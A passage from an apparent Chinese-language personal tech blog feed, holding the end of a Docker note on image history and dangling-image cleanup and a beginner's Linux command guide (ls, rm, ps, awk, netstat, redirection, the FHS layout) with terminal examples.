<span class="built_in">local</span>]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line"><span class="comment">#其它信息可以通过</span></span><br><span class="line">docker inspect xx</span><br><span class="line"><span class="comment">#分层信息,FROM不算</span></span><br><span class="line">[root@localhost cts]<span class="comment"># docker history youzipii:1.0</span></span><br><span class="line">IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT</span><br><span class="line">3f62d30f08dd   6 minutes ago    CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;/bin/bash&quot;</span>]                0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago    RUN /bin/sh -c yum install -y wget vim net-t…   297MB     buildkit.dockerfile.v0</span><br><span class="line">.....</span><br><span class="line">[root@localhost ~]<span class="comment"># docker run -w /root -it centos7:net-tools</span></span><br><span class="line">[root@6aaf937d3252 ~]<span class="comment"># pwd</span></span><br><span class="line">/root</span><br><span class="line">[root@6aaf937d3252 ~]<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker run --name ct2  -it centos7:net-tools</span></span><br><span class="line">[root@49b72fcb1f16 /]<span class="comment"># pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="comment">#可以看到-w可以指定工作目录，不指定则是默认的workdir</span></span><br></pre></td></tr></table></figure><p>如果build相同的镜像，后面的会被看作悬虚镜像</p><h3 id="可以构建出新的镜像的方式有"><a href="#可以构建出新的镜像的方式有" class="headerlink" title="可以构建出新的镜像的方式有:"></a>可以构建出新的镜像的方式有:</h3><ol><li>docker build.</li><li>docker commit.</li><li>docker import(注意，docker load并没有构建出新的镜像，其与原镜像是同一个镜像).</li><li>docker compose.</li><li>docker hub中完成Automated Builds.</li></ol><h2 id="悬虚镜像"><a href="#悬虚镜像" class="headerlink" title="悬虚镜像"></a>悬虚镜像</h2><p>悬虚镜像是指既没有 Repository 又没有 Tag的镜像。当新建了一个镜像后，为该镜像指定了一个已经存在的 TAG，那么原来的镜像就会变为悬空镜像。</p><p>为了演示悬虚镜像的生成过程，这里先修改前面定义的 Dockerfile，然后再生成镜像，且生成的新的镜像与前面构建的镜像的名称与 Tag 均相同。</p><p>删除悬虚镜像：</p><p>悬虚镜像是一种“无用”镜像，其存在只能是浪费存储空间，所以一般都是要删除的对于悬虚镜像的删除，除了可以通过 docker</p><p>rmi<imagelD> 进行删除外，还有专门的删除命令 docker image prune。该命令能够一次性删除本地全部的悬空镜像。不过有个前提，就是这些悬虚镜像不能是已经启动了容器的，无论容器是否是退出状态。当然，如果再加上-a选项，则会同时再将没有被任何容器使用的镜像也删除。。</p><p>另外，还有一个命令 docker system prune 也可以删除悬虚镜像。只不过，其不仅删除的是悬虚镜像，还有其它系统“无用”内容。。<br>在删除这个悬虚镜像之前,首先查看其是否启动了容器。如果启动了,则先将容器删除。”</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docke system/image prune</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240324230130877.png" alt="image-20240324230130877"></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2023/11/01/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/01/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux下基本命令的掌握"><a href="#Linux下基本命令的掌握" class="headerlink" title="Linux下基本命令的掌握"></a>Linux下基本命令的掌握</h2><h3 id="ls指令"><a href="#ls指令" class="headerlink" title="ls指令"></a>ls指令</h3><p>语法：ls [ 选项 ] [文件或目录]</p><p>功能：对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><p>常用选项：</p><ul><li>-a 列出目录下的所有文件，包括以.开头的隐含文件。</li><li>-d 将目录象文件一样显示，而不是显示其下的文件。如:ls -d指定目录</li><li>-i 输出文件的i节点的索引信息。如ls -ai指定文件</li><li>-k 以k字节的形式表示文件的大小。ls -alk 指定文件</li><li>-| 列出文件的详细信息。</li><li>-t 以时间排序。</li><li>-R 列出所有子目录下的文件。(递归)</li><li>-h 可以显示大小单位，但要和-l参数一起使用</li></ul><h4 id="文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841"><a href="#文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841" class="headerlink" title="文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][https://zhuanlan.zhihu.com/p/505338841]"></a>文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][<a href="https://zhuanlan.zhihu.com/p/505338841]">https://zhuanlan.zhihu.com/p/505338841]</a></h4><h3 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h3><p>语法：pwd</p><p>功能：显示用户当前所在目录</p><p>常用选项：无</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031195748175.png" alt="image-20231031195748175"></p><h3 id="cd指令"><a href="#cd指令" class="headerlink" title="cd指令"></a>cd指令</h3><p>Linux系统中，磁盘上的文件和目录被组成一颗目录树，每个节点都是目录或文件</p><p>语法：cd 目录名</p><p>功能：改变工作目录，将当前工作目录改变到指定的目录下</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..: 返回上级目录</span><br><span class="line">cd /root/Desktop: 绝对路径</span><br><span class="line">cd ../day02/:相对路径</span><br><span class="line">cd ~: 进入用户家目录</span><br><span class="line">cd -: 返回最近访问的目录</span><br></pre></td></tr></table></figure><h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><p>语法：touch [选项]…文件…</p><p>功能：touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在的文件。</p><p>常用选项：</p><ul><li>-a 或-time&#x3D;atime或–time-access或–time&#x3D;use只改存取时间</li><li>-d 适用指定的日期时间，而非现在的时间</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本和touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同</li><li>-t 使用指定的日期时间，而非现在的时间</li></ul><h3 id="mkdir指令（重要）"><a href="#mkdir指令（重要）" class="headerlink" title="mkdir指令（重要）"></a>mkdir指令（重要）</h3><p>语法：mkdir [选项] dirname…</p><p>功能：在当前目录下创建一个名问dirname的目录</p><p>常用选项：</p><ul><li>-p,–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在，加上此选项后，系统将自动建立那些尚不存在的目录，即一次可以建立多个目录。</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdi -p /test/test1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031202106611.png" alt="image-20231031202106611"></p><h3 id="rmdir指令-amp-amp-rm指令（重要）"><a href="#rmdir指令-amp-amp-rm指令（重要）" class="headerlink" title="rmdir指令&amp;&amp;rm指令（重要）"></a>rmdir指令&amp;&amp;rm指令（重要）</h3><p>rmdir是一个与mkdir相应的命令，mkdir是建立目录，而rmdir是删除命令。</p><p>语法：rmdir [-p] [dirname]</p><p>适用对象：具有当前目录操作权限的使用者</p><p>功能：删除空目录</p><p>常用选项：</p><ul><li>-p 当子目录被删除后如果父目录变成空目录的话，就连带父目录一起删除</li></ul><p>rm命令可以同时删除文件或目录</p><p>语法： rm[-f-i-r-v] [dirname&#x2F;dir]</p><p>适用对象：所有适用者</p><p>功能：删除文件或目录</p><p>常用选项：</p><ul><li>-f 即使文件属性为只读，也直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件</li></ul><h3 id="man指令（重要）"><a href="#man指令（重要）" class="headerlink" title="man指令（重要）"></a>man指令（重要）</h3><p>Linux的命令有很多参数，我们不可能全记住，我们可以通过查看联机手册获取帮助。访问Linux手册页的命令是man。</p><p>语法：man [选项] 命令</p><p>常用选项：</p><ul><li><p>-k 根据关键词搜索联机帮助</p></li><li><p>num只在第num章节找</p></li><li><p>-a 将所有章节的都显示出来，比如man printf它缺省从第一章开始搜索，知道就停止，用a选项，当按下q退出，他会继续往后面搜索，知道所有章节都搜索完毕</p></li><li><p>1是普通命令</p></li><li><p>2 是系统调用如open，write之类的（通过这个，至少可以方便的差导调用这个函数们需要加什么头文件）</p></li><li><p>3 是库函数,如printf,fread</p></li><li><p>4 是特殊文件,也就是&#x2F;dev下的各种设备文件</p></li><li><p>5 是指文件的格式,比如passwd,就会说明这个文件中各个字段的含义</p></li><li><p>6 是给游戏留的,由各个游戏自己定义</p></li><li><p>7 是附件还有一些变量,比如向environ这种全局变量在这里就有说明</p></li><li><p>8 是系统管理用的命令,这些命令只能由root使用,如ifconfig</p></li></ul><p>man手册可以汉化。</p><h3 id="cp指令重要"><a href="#cp指令重要" class="headerlink" title="cp指令重要"></a>cp指令重要</h3><p>语法：cp [选项] 源文件或者目录 目标文件或者目录</p><p>功能：复制文件或目录</p><p>说明：cp指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后的目的地并非一个已存在的目录，则会出现错误信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031210152423.png" alt="image-20231031210152423"></p><p>常用选项：</p><ul><li>-f或–force强行复制文件或目录，不论目的文件或目录是否已经存在</li><li>-i或–interactive覆盖文件之前先询问用户</li><li>-r递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的志，不属于目录或符号链接，则一律视为普通文件处理</li><li>-R或–recursive递归处理，将指定目录下的文件及子自录—升处理</li></ul><h3 id="mv指令（重要）"><a href="#mv指令（重要）" class="headerlink" title="mv指令（重要）"></a>mv指令（重要）</h3><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename)files）,是linux系统下常用的命令。经常用来备份文件或目录</p><p>语法：mv [选项] 源文件或者目录 目标文件或者目录</p><p>功能：</p><ol><li>视mv命令中第二个参数类型的不同(是目标文件还是目标目录)，mv命令将文件重命名或将其移至一个新的目录中。</li><li>当第二个参数类型是文件时、mv命令完成文件重命名，此时，源文件只能有一个(也可以是源目录名)，它将所给的源文件或目录重命名为给定的日标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。</li></ol><p>常用选项：</p><ul><li>-f : force强制的意思，如果目标文件已经存在，不会询问而直接覆盖. </li><li>-i :若目标文件(destination)已经存在时，就会询问是否覆盖!</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将rm改成mv</span><br><span class="line">vim ~/.bashrc #修改这个文件</span><br><span class="line">mkdir -p ~/.trash</span><br><span class="line">alias rm=trash</span><br><span class="line">alias ur=undelfile</span><br><span class="line">undelfile() &#123;</span><br><span class="line">mv -i !.trash/\$@ ./</span><br><span class="line">&#125;</span><br><span class="line">trash() &#123;</span><br><span class="line">mv $@ ~/.trash/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>语法： cat [选项] [文件]</p><p>功能：查看目标文件内容</p><p>常用选项：</p><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行</li></ul><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>date指定格式显示时间 date+%Y:%m:%d</p><p>date用法：date[option]…[+Format]</p><ol><li><p>在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中常用的标记列表如下</p><ul><li>%H:小时(O0..23)</li><li>%M:分钟(00..59)</li><li>%S∶秒(00..61)</li><li>%X∶相当于%H:%M:%S</li><li>%d:日(01..31)</li><li>%m :月份(01..12)</li><li>%Y:完整年份(0000..9999)</li><li>%F:相当于%Y-%m-%d</li></ul></li><li><p>在设定时间方面</p><ul><li>date -s &#x2F;&#x2F;设置当前时间，只有root权限才能设置，其他只能查看。</li><li>date -s 20080523&#x2F;设置成20080523，这样会把具体时间设置成空00:00:00</li><li>date -s 01:01:01&#x2F;&#x2F;设置具体时间，不会对日期做更改</li><li>date -s “01:01:01 2008-05-23”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “01:01:01 20080523”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “2008-05-23 01:01:01”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “200805230 1:01:01”&#x2F;&#x2F;这样可以设置全部时间</li></ul></li><li><p>时间戳</p><p>时间-&gt;时间戳</p><ul><li>date +%s</li></ul><p>时间戳-&gt;时间</p><ul><li>date+%Y:%m:%d -d @1599642565</li></ul><p>Unix时间戳(英文为Unix epoch, Unix time, POSIX time或Unix timestamp)是从1970年1月1日(UTCGMT的午夜)开始所经过的秒数，不考虑闰秒。</p></li></ol><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。我们目前要了解的选项</p><p>选项：</p><ul><li>-u&lt;用户名&gt;指定用户名</li><li>-p&lt;进程号&gt;指定进程</li><li>-n&lt;次数&gt;循环显示的次数</li></ul><h3 id="shutdown关机"><a href="#shutdown关机" class="headerlink" title="shutdown关机"></a>shutdown关机</h3><p>语法：shutdown [选项] 常见选项：</p><ul><li>-h :将系统的服务停掉后，立即关机</li><li>-r ︰在将系统的服务停掉之后就重新启动</li><li>-t sec : -t后面加秒数，亦即『过几秒后关机』的意思</li></ul><p>如果后面购买了云服务器，尽量不要使用shutdown来关机，因为云服务器一般都要保证服务器一直在线，使用exit或者ctrl+d退出即可</p><h3 id="重要的几个热键-Tab-CTRL-c-CTRL-d"><a href="#重要的几个热键-Tab-CTRL-c-CTRL-d" class="headerlink" title="重要的几个热键[Tab],[CTRL]+c,[CTRL]+d"></a>重要的几个热键[Tab],[CTRL]+c,[CTRL]+d</h3><ul><li><p>ctrl + d：退出登陆用户或键盘输入结束</p></li><li><p>tab键：命令或档案的补全</p></li><li><p>ctrl+c：终止前台异常进程</p></li></ul><h3 id="以下命令后续逐一补全"><a href="#以下命令后续逐一补全" class="headerlink" title="以下命令后续逐一补全:"></a>以下命令后续逐一补全:</h3><ul><li>安装和登录命令: login、shutdown、halt、reboot、install、mount、umount、chsh、exit、last;</li><li>文件处理命令: file、mkdir、grep、dd、find、mv、ls、diff、cat、In;</li><li>系统管理相关命令: df、top、free、quota、at、lp、adduser、groupadd、kill、crontab;</li><li>网络操作命令: ifconfig、 ip、ping、netstat、telnet、ftp、route、rlogin、rcp、finger、mail、nslookup</li><li>系统安全相关命令: passwd、su、umask、chgrp、chmod、chown、chattr、sudo ps、who;</li><li>其它命令: tar、unzip、gunzip、unarj、mtools、man、unendcode、uudecode。</li></ul><h3 id="netstat-重要"><a href="#netstat-重要" class="headerlink" title="netstat (重要)"></a>netstat (重要)</h3><p><code>netstat</code>命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。<code>netstat</code>是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。</p><ul><li><p>-a：查看所有连接</p></li><li><p>-c：持续列出网络状态</p></li><li><p>-e：显示网络其他相关信息</p></li><li><p>-n:直接打印连接的IP地址与端口信息</p></li><li><p>-l  或–listening           显示监控中的服务器的Socket。</p></li><li><p>-p  或–programs         显示正在使用Socket的程序识别码和程序名称。</p></li><li><p>-r：显示路由信息</p></li><li><p>-t：显示TCP传输协议的连线状况</p></li></ul><p>netstat -lntp可以用来查看服务器是什么</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>查看进程的PID、名称以及CPU占用率：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps axo pid,comm,pcpu</span><br></pre></td></tr></table></figure><p>按内存资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -rnk <span class="number">4</span></span><br></pre></td></tr></table></figure><p>按CPU资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -nk <span class="number">3</span></span><br></pre></td></tr></table></figure><p>显示所有进程信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -A</span><br></pre></td></tr></table></figure><p>显示指定用户信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -u root</span><br></pre></td></tr></table></figure><p>查看线程数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -efL</span><br></pre></td></tr></table></figure><p>查看进程并按内存使用大小排列：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o <span class="string">&quot;%C : %p :%z : %a&quot;</span> | sort -k5 -nr</span><br></pre></td></tr></table></figure><p>显示所有进程信息，连同命令行：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>ps与grep常用组合用法，查找特定进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br></pre></td></tr></table></figure><p>通过名字或命令搜索进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -C nginx</span><br></pre></td></tr></table></figure><p>CPU或者内存进行排序，降序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux --sort=-pcpu,+pmem</span><br></pre></td></tr></table></figure><p>用树的风格显示进程的层次关系：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -f --forest -C nginx</span><br></pre></td></tr></table></figure><p>显示一个父进程的子进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o pid,uname,comm -C nginx</span><br></pre></td></tr></table></figure><p>重定义标签：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,uname=<span class="variable constant_">USERNAME</span>,pcpu=<span class="variable constant_">CPU_USAGE</span>,pmem,comm</span><br></pre></td></tr></table></figure><p>显示进程运行的时间：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,comm,etime</span><br></pre></td></tr></table></figure><p>查看named进程详细信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux | grep named</span><br></pre></td></tr></table></figure><p>通过进程id获取服务名称：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o command -p <span class="number">91730</span> | sed -n 2p</span><br></pre></td></tr></table></figure><p>将目前属于您自己这次登入的PID与相关信息列示出来：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -l</span><br></pre></td></tr></table></figure><p>列出目前所有的正在内存当中的程序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>找出与<code>cron</code>与<code>syslog</code>这两个服务有关的PID号码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | egrep <span class="string">&#x27;(cron|syslog)&#x27;</span></span><br></pre></td></tr></table></figure><p>把所有进程显示出来，并输出到<code>ps001.txt</code>文件：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux &gt; ps001.<span class="property">txt</span></span><br></pre></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得<br>尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各<br>种分析处理。</p><p>awk有3个不同版本: awk、 nawk和gawk, 未作特别说明，一般指gawk, gawk 是AWK的GNU版本。<br>awk其名称得自于它的创始人Alfred Aho、Peter Weinberger和Brian Kernighan 姓氏的首个字母。实<br>际上AWK的确拥有自己的语言: AWK 程序设计语言，三位创建者已将它正式定义为“样式扫描和处<br>理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计<br>算以及生成报表，还有无数其他的功能。</p><p>有三种方式调用awk:</p><ul><li>1.命令行方式- (重点介绍)<br>awk [-F field-separator]<br>commands’<br>input-file(s)<br>其中，commands是真正awk命令，[-F域分隔符]是可选的。input-file(s) 是待处理的文件。<br>在awk中，文件的每一行中， 由域分隔符分开的每一项称为- 一个域。通常，在不指名F域分隔<br>符的情况下，默认的域分隔符是空格。</li><li>shell脚本方式<br>将所有的awk命令插入-一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，<br>-般通过键入脚本名称来调用。<br>相当于shell脚本首行的: #!&#x2F;bin&#x2F;bash<br>可以换成: #!&#x2F;bin&#x2F; awk</li><li>将所有的awk命令插入- -个单独文件,然后调用:<br>awk -f awk -script-file input-file(s)<br>其中，-f选项加载awk- script-file中的awk脚本，input-file(s) 跟上面的是一样</li></ul><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ last -5</span><br><span class="line">youzipii pts/1        192.168.174.1    Wed Mar 13 17:17   still logged in</span><br><span class="line">youzipii pts/0        :0               Wed Mar 13 17:16   still logged in</span><br><span class="line">youzipii :0           :0               Wed Mar 13 17:11   still logged in</span><br><span class="line">(unknown :0           :0               Wed Mar 13 16:54 - 17:11  (00:17)</span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Wed Mar 13 16:53 - 17:28  (00:34)</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">[youzipii@localhost ~]$ last -n 5 | awk &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">(unknown</span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br></pre></td></tr></table></figure><p>awk工作流程是这样的:读入有’ \n’换行符分割的一- 条记录，然后将记录按指定的域分隔符划分域，<br>填充域，$0则表示所有域, $1表示第- -个域, $n表示第n个域。默认域分隔符是”空白键”或”[tab]<br>键”,所以$1表示登录用户，$3表示登录用户ip,以此类推,可以用逗号隔开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&quot;\t&quot;$7&#125;&#x27;</span><br><span class="line">root    /bin/bash</span><br><span class="line">bin     /sbin/nologin</span><br><span class="line">daemon  /sbin/nologin</span><br><span class="line">adm     /sbin/nologin</span><br><span class="line">lp      /sbin/nologin</span><br><span class="line">sync    /bin/sync</span><br><span class="line">[youzipii@localhost ~]$ ifconfig | awk &#x27;/mask/&#x27;</span><br><span class="line">        inet 192.168.174.142  netmask 255.255.255.0  broadcast 192.168.174.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>-F 指定分隔符为：</p><p>&#x2F;内容&#x2F;打印内容所在行</p><h2 id="Linux重定向管道命令环境变量PATH"><a href="#Linux重定向管道命令环境变量PATH" class="headerlink" title="Linux重定向管道命令环境变量PATH"></a>Linux重定向管道命令环境变量PATH</h2><h3 id="Linux目录配置标准FHS"><a href="#Linux目录配置标准FHS" class="headerlink" title="Linux目录配置标准FHS"></a>Linux目录配置标准FHS</h3><p>是什么?</p><p>FHS本质一套规定Linux目录结构，软件建议安装位置的标准<br>为什么?</p><p>使用Linux来开发产品或者发布软件的公司、个人太多，如果每家公司或者个人都按照自己的意愿来配置文件或者软件的存放位置，这无疑是一场灾难。我们可不想学完我们的Linux之后，去公司发现看不懂别人的目录结构，更别谈开发了。<br>怎么办?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入根目录</span><br><span class="line">[root@1ocalhost home]# cd /</span><br><span class="line">#查看目录树(两层，只看目录，不看文件)</span><br><span class="line">[root@localhost /]# tree -d -L 1</span><br><span class="line">.</span><br><span class="line">|- bin -&gt; usr/bin #可执行文件目录，linux白带命令在这里</span><br><span class="line">|- boot #开机会使用到的文件，包括活Linux核心文件以及开机菜单与开机所需配置文件等等。</span><br><span class="line">|- dev #设备目录</span><br><span class="line">|- etc #配置文件几乎都放宣在这个自录内，例如人员的帐号密码档、各种服务的启始档等等</span><br><span class="line">|- home #家目录，系统默认的使用者主文件夹，用户的个人文件都可放在这里</span><br><span class="line">|-lib -&gt; usr/lib #放置在开机时会用到的函数库，以及在/bin或/sbin下面的指令会调用的l函数库l</span><br><span class="line">|-lib64 -&gt; usr /lib64#与lib类似</span><br><span class="line">|- media #放置可移除的设备，包括软盘、光盘、DVD等等设备都暂时挂载于此。</span><br><span class="line">|- mnt #设备临时挂载目录</span><br><span class="line">|─ opt #第三方协力软件放置的目录</span><br><span class="line">|- proc #是一个虚拟文件系统，放置内存中的数据，不占用硬盘空间</span><br><span class="line">|- root #系统管理员的主文件夹</span><br><span class="line">|- run#放置系统开机后所产生的各项信息</span><br><span class="line">|- sbin -&gt; usr/sbin #里面包括了开机、修复、还原系统所需要的指令，root用户使用</span><br><span class="line">|- srv #service是一些网络服务启动之后，这些服务所需要取用的数据目录。</span><br><span class="line">|—- sys #与proc类似</span><br><span class="line">|- tmp #temp,让一般使用者或者是正在执行的程序暂时放置文件的地方</span><br><span class="line">|- usr #unix software resource:与软件安装/执行有关</span><br><span class="line">|- var #variable,与系统运行过程有关,主要为变动性较大的数据</span><br><span class="line">10diro-torioc</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917"><a href="#linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917" class="headerlink" title="linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][https://blog.csdn.net/lzq00277/article/details/108303917]"></a>linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][<a href="https://blog.csdn.net/lzq00277/article/details/108303917]">https://blog.csdn.net/lzq00277/article/details/108303917]</a></h4><h3 id="Linux数据重定向的理解与操作"><a href="#Linux数据重定向的理解与操作" class="headerlink" title="Linux数据重定向的理解与操作"></a>Linux数据重定向的理解与操作</h3><h4 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h4><p>基本大部分计算机，要与人交互，都要默认打开三个设备(文件)</p><ul><li>标准输入，stdin，代码是0</li><li>标准输出，stdout，代码是1</li><li>标准错误输出，stderr，代码是2</li></ul><p>为什么?</p><p> Linux一切皆文件，交互需求，输入输出信息分类<br>除了上面的三个标准设备(文件)，我们可能经常有从文件读取数据,或者将数据写入文件的场景</p><h4 id="重定向的理解"><a href="#重定向的理解" class="headerlink" title="重定向的理解"></a>重定向的理解</h4><p>是什么?</p><ul><li>输出&#x2F;追加重定向:本来应该显示到显示器(通常)文件的内容，写入到文件当中。</li><li>输入重定向:或者本来应该从显示器(通常)文件读取数据，转化成从指定文件读取数据</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost test1]# touch file1 file2 file3</span><br><span class="line">[root@localhost test1]# ls   #当前只有三个文件</span><br><span class="line">file1  file2  file3</span><br><span class="line">[root@localhost test1]# whoami #该命令输出的结果,默认是直接打印到标准输出的stdout文件中</span><br><span class="line">root</span><br><span class="line">[root@localhost test1]# whoami&gt;file4 #输出重定向,不在显示出来</span><br><span class="line">[root@localhost test1]# ll #新创建文件file4</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file1</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 5 Oct 31 07:47 file4</span><br><span class="line">[root@localhost test1]# cat file4 #本来应该显示到显示器的内容, 写到了file4文件中</span><br><span class="line">root</span><br><span class="line">#追加重定向</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot;&gt;file4 #将新内容重定向到文件file4中</span><br><span class="line">[root@localhost test1]# cat file4 #发现之前的root被覆盖了</span><br><span class="line">hello bit</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #连续重定向多此,发现文件内容并无变化</span><br><span class="line">hello bit 其实并不是没有变化,而是每次写入都是重头开始</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit2&quot; &gt;&gt; file4</span><br><span 